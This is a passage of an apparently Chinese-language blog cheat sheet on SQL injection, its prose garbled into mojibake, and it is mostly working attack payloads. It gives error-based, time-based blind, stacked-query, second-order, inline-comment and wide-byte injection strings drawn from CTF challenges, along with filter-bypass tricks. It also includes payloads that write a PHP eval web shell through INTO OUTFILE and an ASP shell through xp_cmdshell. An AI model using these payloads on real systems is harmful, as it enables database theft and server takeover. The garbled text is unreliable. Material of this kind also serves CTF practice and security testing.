class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a><strong>exp()</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a))</span><br></pre></td></tr></table></figure><h4 id="å…¶ä»–å¼•å‡ºæŠ¥é”™çš„æ–¹æ³•"><a href="#å…¶ä»–å¼•å‡ºæŠ¥é”™çš„æ–¹æ³•" class="headerlink" title="å…¶ä»–å¼•å‡ºæŠ¥é”™çš„æ–¹æ³•"></a><strong>å…¶ä»–å¼•å‡ºæŠ¥é”™çš„æ–¹æ³•</strong></h4><p>åœ¨information_schemaç­‰è¢«è¿‡æ»¤çš„å‰æä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ç»•è¿‡å¹¶å¼•å‘æŠ¥é”™</p><p>çˆ†æ•°æ®åº“å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span><span class="operator">-</span>a();</span><br></pre></td></tr></table></figure><p>çˆ†è¡¨å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> Polygon(id))))</span><br></pre></td></tr></table></figure><p>çˆ†å­—æ®µå</p><p>ç”¨union</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> e<span class="number">.4</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a,(<span class="keyword">select</span> <span class="number">2</span>)b,(<span class="keyword">select</span> <span class="number">3</span>)c,(<span class="keyword">select</span> <span class="number">4</span>)d <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test)e limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">3</span>)f,(<span class="keyword">select</span> <span class="number">1</span>)g,(<span class="keyword">select</span> <span class="number">1</span>)h,(<span class="keyword">select</span> <span class="number">1</span>)i;</span><br></pre></td></tr></table></figure><p>ä¸ç”¨union</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">as</span> a <span class="keyword">join</span> test <span class="keyword">as</span> b) <span class="keyword">as</span> c);</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> ç¬¬ä¸€ä¸ªå­—æ®µå‡ºæ¥å,ä½¿ç”¨<span class="keyword">using</span>çˆ†ç¬¬äºŒä¸ª</span><br><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">as</span> a <span class="keyword">join</span> test <span class="keyword">as</span> b <span class="keyword">using</span>(id)) <span class="keyword">as</span> c);</span><br></pre></td></tr></table></figure><p>egï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a  <span class="keyword">join</span> news <span class="keyword">as</span> b) <span class="keyword">as</span> c;</span><br><span class="line"></span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name â€˜idâ€™</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">using</span>(id)) c;</span><br><span class="line"></span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name â€˜nameâ€™</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">using</span>(id,name)) c;</span><br><span class="line"></span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name â€˜passwdâ€™</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">using</span>(id,name,passwd)) c;</span><br></pre></td></tr></table></figure><h3 id="æ—¶é—´æ³¨å…¥"><a href="#æ—¶é—´æ³¨å…¥" class="headerlink" title="æ—¶é—´æ³¨å…¥"></a>æ—¶é—´æ³¨å…¥</h3><p>åœ¨booleanæ³¨å…¥æ— å›æ˜¾æ—¶ï¼Œä½¿ç”¨æ¬¡æ–¹æ³•æ¥åˆ¤æ–­æ˜¯å¦æˆåŠŸ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">åŸºäºsleepçš„å»¶è¿Ÿ </span><br><span class="line">xx<span class="string">&#x27; or if(length((select database()))&gt;1,sleep(5),1) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ç¬›å¡å°”ä¹˜ç§¯è¿ç®—æ—¶é—´é€ æˆçš„æ—¶é—´å»¶è¿Ÿ</span></span><br><span class="line"><span class="string">xx&#x27;</span> <span class="keyword">or</span> if(length((<span class="keyword">select</span> database()))<span class="operator">&gt;</span><span class="number">1</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.columns A,information_schema.columns p B,information_schema.columns C),<span class="number">1</span>) # </span><br><span class="line"></span><br><span class="line">åŸºäºbenchmarkçš„å»¶è¿Ÿ </span><br><span class="line">xx<span class="string">&#x27;or if(length((select database()))&gt;1,(select BENCHMARK(10000000,md5(&#x27;</span>a<span class="string">&#x27;))),1) #--å¤§æ¦‚ä¼šç”¨2Sæ—¶é—´</span></span><br></pre></td></tr></table></figure><p><strong>ä¸€èˆ¬æµç¨‹</strong></p><p>çˆ†åº“å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span>,<span class="number">1</span>,sleep(<span class="number">3</span>))<span class="operator">%</span><span class="number">23</span></span><br><span class="line">ä½¿ç”¨äºŒåˆ†æ³•ï¼Œä¸€æ­¥ä¸€æ­¥çˆ†å‡ºæ•°æ®åº“åï¼Œå‡è®¾å…¶ä¸­æœ‰ä¸€æ•°æ®åº“åä¸ºflag</span><br></pre></td></tr></table></figure><p>çˆ†è¡¨å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>â€™flagâ€™Â limitÂ <span class="number">1</span>,<span class="number">1</span>) ,<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">101</span>,<span class="number">1</span>,sleep(<span class="number">3</span>)) <span class="operator">%</span><span class="number">23</span></span><br><span class="line">å‡è®¾æœ‰ä¸€è¡¨åä¸ºflagtable</span><br></pre></td></tr></table></figure><p>çˆ†åˆ—å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>â€™flagtableâ€™Â limitÂ <span class="number">1</span>,<span class="number">1</span>) ,<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span>,<span class="number">1</span>,sleep(<span class="number">3</span>)) <span class="operator">%</span><span class="number">23</span>ï¼Œ</span><br><span class="line">å‡è®¾çˆ†å‡ºåˆ—åä¸ºnameå’Œpassword</span><br></pre></td></tr></table></figure><p>çˆ†è¡¨ä¸­çš„å†…å®¹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span>Â group_concat(name,password)Â <span class="keyword">from</span> flag.flagtable limit <span class="number">0</span>,<span class="number">1</span>) ,<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">48</span>,<span class="number">1</span>,sleep(<span class="number">3</span>)) <span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><h3 id="å †å æŸ¥è¯¢æ³¨å…¥"><a href="#å †å æŸ¥è¯¢æ³¨å…¥" class="headerlink" title="å †å æŸ¥è¯¢æ³¨å…¥"></a>å †å æŸ¥è¯¢æ³¨å…¥</h3><p><strong>åˆ©ç”¨handler</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span><span class="string">&#x27;;select if(sub(user(),1,1)=&#x27;</span>r<span class="string">&#x27;,sleep(3),1)%23</span></span><br></pre></td></tr></table></figure><p>HANDLER â€¦ OPENè¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­HANDLER â€¦ READè¯­å¥è®¿é—®ï¼Œè¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨HANDLER â€¦ CLOSEæˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­</p><p>åŸºæœ¬å½¢å¼</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name <span class="keyword">CLOSE</span> </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>å…¶ä¸­  HANDLER tbl_name <span class="keyword">OPEN</span> <span class="keyword">AS</span> example</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>å…¶å  HANDLER example READ index_name<span class="operator">=</span>&quot;example2&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled.png" alt=""></p><p><strong>åˆ©ç”¨rename</strong></p><p>ä»¥å¼ºç½‘æ¯éšä¾¿æ³¨ä¸ºä¾‹</p><p>1ï¼Œé€šè¿‡ rename å…ˆæŠŠ words è¡¨æ”¹åä¸ºå…¶ä»–çš„è¡¨åã€‚</p><p>2ï¼ŒæŠŠ 1919810931114514 è¡¨çš„åå­—æ”¹ä¸º words ã€‚</p><p>3 ï¼Œç»™æ–° words è¡¨æ·»åŠ æ–°çš„åˆ—å id ã€‚</p><p>4ï¼Œå°† flag æ”¹åä¸º data ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; rename table words to word1; rename table  `1919810931114514` to words; alert table words </span></span><br><span class="line"><span class="string">add id int unsigned not Null auto_increment primary key ; alert table words change flag data </span></span><br><span class="line"><span class="string">varchar(100); #</span></span><br></pre></td></tr></table></figure><p>å…·ä½“æ€è·¯ä¸ºå°†éœ€è¦è·å¾—çš„æ•°æ®çš„è¡¨ã€åˆ—ç­‰åå­—ä¿®æ”¹ä¸ºç›®å‰å¯ä»¥æŸ¥è¯¢åˆ°çš„è¡¨å’Œåˆ—çš„åå­—ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ä¿®æ”¹éœ€è¦è·å¾—æ•°æ®çš„è¡¨ã€åˆ—çš„åå­—å‰ï¼Œéœ€è¦å…ˆå°†ç›®å‰å¯ä»¥æŸ¥è¯¢åˆ°çš„è¡¨å’Œåå­—å…ˆè¿›è¡Œä¿®æ”¹ï¼Œç„¶ååœ¨åˆ©ç”¨é¡µé¢æœ¬æ¥å°±æœ‰çš„æŸ¥è¯¢åŠŸèƒ½æŸ¥è¯¢æ•æ„Ÿæ•°æ®ã€‚</p><p><strong>åˆ©ç”¨execute</strong></p><p>åŒè·ç¦»19å¼ºç½‘æ¯çš„éšä¾¿æ³¨</p><p>executeç”¨æ¥æ‰§è¡Œç”±SQLPrepareåˆ›å»ºçš„SQLè¯­å¥ã€‚</p><p>å°†select * from <code>1919810931114514</code>è¿›è¡Œ16è¿›åˆ¶ç¼–ç </p><p>å†æ„é€ å‡º</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">SeT</span><span class="variable">@a</span><span class="operator">=</span><span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="keyword">prepare</span> execsql <span class="keyword">from</span> <span class="variable">@a</span>;<span class="keyword">execute</span> execsql;#</span><br></pre></td></tr></table></figure><p>prepareâ€¦fromâ€¦æ˜¯é¢„å¤„ç†è¯­å¥ï¼Œä¼šè¿›è¡Œç¼–ç è½¬æ¢ã€‚åˆ©ç”¨è¿™ä¸ªæ¥è®©è¯­å¥è¿›è¡Œè§£ç </p><h3 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h3><p>æŠŠéæ³•ä»£ç å†™å…¥æ•°æ®åº“ï¼ˆåˆ©ç”¨â€˜\â€™è¿›è¡Œè½¬ä¹‰å†™å…¥ï¼‰ï¼Œç„¶ååœ¨å…¶ä»–åœ°æ–¹è°ƒç”¨è¿™ä¸ªæ•°æ®æ‹¼æ¥æˆä¸ºéæ³•ä»£ç å†™å…¥sqlè¯­å¥ä¸­</p><p>ç®€å•çš„é€»è¾‘å¦‚ä¸‹</p><p>éæ³•ä»£ç è½¬ä¹‰ â€”å­˜å…¥â€”&gt;æ•°æ®åº“â€”å–å‡ºâ€”&gt;åå°å˜é‡ä¸­â€”æ‹¼æ¥â€”&gt;ç»„æˆéæ³•è¯­å¥</p><p>egï¼š[SWPU2019]Web1</p><p>payload</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#group byè·å–åˆ—æ•°</span></span><br><span class="line"><span class="literal">-1</span><span class="string">&#x27;/**/group/**/by/**/22,&#x27;</span><span class="number">11</span></span><br><span class="line"><span class="comment">#æŸ¥çœ‹ç‰ˆæœ¬</span></span><br><span class="line"><span class="literal">-1</span><span class="string">&#x27;/**/union/**/select/**/1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br><span class="line"><span class="comment">#è·å–è¡¨å</span></span><br><span class="line"><span class="literal">-1</span><span class="string">&#x27;/**/union/**/select/**/1,</span></span><br><span class="line"><span class="string">(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_colum</span></span><br><span class="line"><span class="string">ns/**/where/**/table_schema=schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18</span></span><br><span class="line"><span class="string">,19,20,21,&#x27;</span><span class="number">22</span></span><br><span class="line"><span class="comment">#è·å–ç”¨æˆ·å</span></span><br><span class="line"><span class="literal">-1</span><span class="string">&#x27;/**/union/**/select/**/1,</span></span><br><span class="line"><span class="string">(select/**/group_concat(a)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele</span></span><br><span class="line"><span class="string">ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br><span class="line"><span class="comment">#è·å–å¯†ç </span></span><br><span class="line"><span class="literal">-1</span><span class="string">&#x27;/**/union/**/select/**/1,</span></span><br><span class="line"><span class="string">(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele</span></span><br><span class="line"><span class="string">ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br></pre></td></tr></table></figure><h3 id="å†…è”æ³¨å…¥"><a href="#å†…è”æ³¨å…¥" class="headerlink" title="å†…è”æ³¨å…¥"></a>å†…è”æ³¨å…¥</h3><p>ä¸¾ä¾‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="comment">/*!UNION*/</span> <span class="comment">/*!SELECT*/</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨åˆ«åï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,a.id,b.id,<span class="operator">*</span> <span class="keyword">from</span>(sys_admin <span class="keyword">as</span> a <span class="keyword">inner</span> <span class="keyword">join</span> sys_admin <span class="keyword">as</span> b <span class="keyword">on</span> a.id<span class="operator">=</span>b.id)</span><br></pre></td></tr></table></figure><h3 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h3><p>GBK å ç”¨ä¸¤å­—èŠ‚</p><p>ASCIIå ç”¨ä¸€å­—èŠ‚</p><p>PHPä¸­ç¼–ç ä¸ºGBKï¼Œå‡½æ•°æ‰§è¡Œæ·»åŠ çš„æ˜¯ASCIIç¼–ç ï¼ˆæ·»åŠ çš„ç¬¦å·ä¸ºâ€œ\â€ï¼‰ï¼ŒMYSQLé»˜è®¤å­—ç¬¦é›†æ˜¯GBKç­‰å®½å­—èŠ‚å­—ç¬¦é›†ã€‚</p><p>å¤§å®¶éƒ½çŸ¥é“%dfâ€™ è¢«PHPè½¬ä¹‰ï¼ˆå¼€å¯GPCã€ç”¨addslasheså‡½æ•°ï¼Œæˆ–è€…icovç­‰ï¼‰ï¼Œå•å¼•å·è¢«åŠ ä¸Šåæ–œæ \ï¼Œå˜æˆäº† %df\â€™ï¼Œå…¶ä¸­\çš„åå…­è¿›åˆ¶æ˜¯ %5C ï¼Œé‚£ä¹ˆç°åœ¨ %df\â€™ =%df%5c%27ï¼Œå¦‚æœç¨‹åºçš„é»˜è®¤å­—ç¬¦é›†æ˜¯GBKç­‰å®½å­—èŠ‚å­—ç¬¦é›†ï¼Œåˆ™MySQLç”¨GBKçš„ç¼–ç æ—¶ï¼Œä¼šè®¤ä¸º %df%5c æ˜¯ä¸€ä¸ªå®½å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯ç¸—ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š%df\â€™ = %df%5c%27=ç¸—â€™ï¼Œæœ‰äº†å•å¼•å·å°±å¥½æ³¨å…¥äº†ã€‚</p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,(select &#x27;</span><span class="operator">&lt;</span>?php <span class="variable">@eval</span>($_POST[<span class="number">1</span>]);?<span class="operator">&gt;</span><span class="string">&#x27; into outfile &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span><span class="number">404.</span>php<span class="string">&#x27;) --+</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä½¿ç”¨dumpfileè¿›è¡Œå†™å…¥ã€‚</p><p><strong>outfileå’Œdumpfileçš„åŒºåˆ«ï¼š</strong></p><p>outfileé€‚åˆå¯¼åº“ï¼Œåœ¨è¡Œæœ«å°¾ä¼šå†™å…¥æ–°è¡Œå¹¶è½¬ä¹‰ï¼Œå› æ­¤ä¸èƒ½å†™å…¥äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ã€‚dumpfileåªèƒ½æ‰§è¡Œä¸€è¡Œæ•°æ®ã€‚</p><p>æ•°æ®åº“å†™å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;echo &quot;&lt;%eXECutegLobaL rEquEst(0)%&gt;&quot; &gt; &quot;c:www\uploadFiles2019-11404.asp&quot;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨æŸ¥è¯¢ä¸å­˜åœ¨ç”¨æˆ·æ—¶è™šæ„ç”¨æˆ·è¿›è¡Œæ³¨å…¥"><a href="#åˆ©ç”¨æŸ¥è¯¢ä¸å­˜åœ¨ç”¨æˆ·æ—¶è™šæ„ç”¨æˆ·è¿›è¡Œæ³¨å…¥" class="headerlink" title="åˆ©ç”¨æŸ¥è¯¢ä¸å­˜åœ¨ç”¨æˆ·æ—¶è™šæ„ç”¨æˆ·è¿›è¡Œæ³¨å…¥"></a>åˆ©ç”¨æŸ¥è¯¢ä¸å­˜åœ¨ç”¨æˆ·æ—¶è™šæ„ç”¨æˆ·è¿›è¡Œæ³¨å…¥</h3><p>mysqlåœ¨æŸ¥è¯¢ä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œä¼šè‡ªåŠ¨æ„å»ºè™šæ‹Ÿæ•°æ®</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%201.png" alt=""></p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%202.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°è¡¨è‡ªåŠ¨åŠ ä¸Šäº†ä¸€ä¸ªç”¨æˆ·</p><p>æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªæ¥è¿›è¡Œç™»å½•è¿›å»adminè´¦æˆ·ç­‰ç”¨é€”</p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="å…³é”®å­—åµŒå¥—ï¼Œå¤§å°å†™ç»•è¿‡"><a href="#å…³é”®å­—åµŒå¥—ï¼Œå¤§å°å†™ç»•è¿‡" class="headerlink" title="å…³é”®å­—åµŒå¥—ï¼Œå¤§å°å†™ç»•è¿‡"></a>å…³é”®å­—åµŒå¥—ï¼Œå¤§å°å†™ç»•è¿‡</h3><p>union=â‡’UNiunionoN</p><h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><p>URLç¼–ç  #â†’%23</p><p>16è¿›åˆ¶ç¼–ç  usersâ†’0x7573657273</p><p>ASCIIç¼–ç </p><p>Unicodeç¼–ç </p><p>åŒé‡ç¼–ç </p><h3 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h3><p>æœ«å°¾æ³¨é‡Šï¼š#,%23,-,â€”+</p><p>/<strong>/æ³¨é‡Šå¯ä»¥ç”¨äºä»£æ›¿ç©ºæ ¼ï¼Œ%0bä»£æ›¿/</strong>/</p><p>å†…è”æ³¨é‡Š/<em>!è¦æ‰§è¡Œçš„code</em>/ä¾‹å¦‚:id=1/<em>!UnIoN</em>/SeLeCT</p><p>â€™ å’Œ â€œ æ³¨é‡Šï¼Œç”¨äºé—­åˆSQLè¯­å¥ä¸­çš„å¼•å·</p><h3 id="å…³é”®å­—æ›¿æ¢"><a href="#å…³é”®å­—æ›¿æ¢" class="headerlink" title="å…³é”®å­—æ›¿æ¢"></a>å…³é”®å­—æ›¿æ¢</h3><ul><li><p>ç©ºæ ¼æ›¿æ¢ï¼š/**/ï¼Œ%a0ï¼Œï¼ˆï¼‰</p></li><li><p>andæ›¿æ¢ï¼š&amp;&amp;</p></li><li><p>oræ›¿æ¢ï¼š||</p></li><li><p>=æ›¿æ¢ï¼š&lt;ï¼Œ&gt;ï¼Œlike , rlike</p></li><li><p>å¼•å·æ›¿æ¢ï¼šç”¨16è¿›åˆ¶ç¼–ç </p></li><li><p>é€—å·ç»•è¿‡</p><p>substrã€mid()å‡½æ•°ä¸­å¯ä»¥åˆ©ç”¨from toæ¥æ‘†è„±å¯¹é€—å·çš„åˆ©ç”¨ï¼›</p><p>limitä¸­å¯ä»¥åˆ©ç”¨offsetæ¥æ‘†è„±å¯¹é€—å·çš„åˆ©ç”¨</p></li><li><p>æ¯”è¾ƒç¬¦å·( &gt;ã€&lt; )ç»•è¿‡ï¼ˆgreatestã€between and)</p></li><li><p>é€»è¾‘ç¬¦å·çš„æ›¿æ¢ï¼ˆand=&amp;&amp; or=|| xor=| not=!ï¼‰</p></li></ul><h3 id="ç­‰ä»·å‡½æ•°ç»•è¿‡"><a href="#ç­‰ä»·å‡½æ•°ç»•è¿‡" class="headerlink" title="ç­‰ä»·å‡½æ•°ç»•è¿‡"></a>ç­‰ä»·å‡½æ•°ç»•è¿‡</h3><p>hex()ã€bin() ==&gt; ascii()<br>sleep() ==&gt;benchmark()<br>concat_ws()==&gt;group_concat()<br>mid()ã€substr() ==&gt; substring()<br>@@user ==&gt; user()<br>@@datadir ==&gt; datadir()ä¸¾ä¾‹ï¼šsubstring()å’Œsubstr()æ— æ³•ä½¿ç”¨æ—¶ï¼š<br>ï¼Ÿid=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74ã€€<br>æˆ–è€…ï¼š<br>substr((select â€˜passwordâ€™),1,1) = 